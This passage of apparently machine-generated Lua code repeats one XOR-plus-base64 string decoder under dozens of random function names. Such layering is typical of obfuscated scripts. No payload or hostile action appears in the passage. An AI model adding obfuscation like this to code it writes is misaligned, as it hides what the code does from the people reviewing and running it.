    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kzogyg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kqtxcx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ynrtjx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xmcxtc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_nni_ex(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_afxqeg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bfupbl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jltbev(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sbzbpk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_novrrg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jhmulx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_nwcphy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_krrjpk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zgkoxy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_v_xaks(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sramgg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pwpnez(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ydl_ql(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fbjtwf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vko_xx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_aecfkq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gbfegv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gfdrnv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ggqwev(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_oeakbl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pcwpcr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cndnhc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wzz_nq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_agjktw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tjhbri(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_apxuht(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rwctmm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kzmlst(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zxhfab(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vygudz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ueblra(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cnspin(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
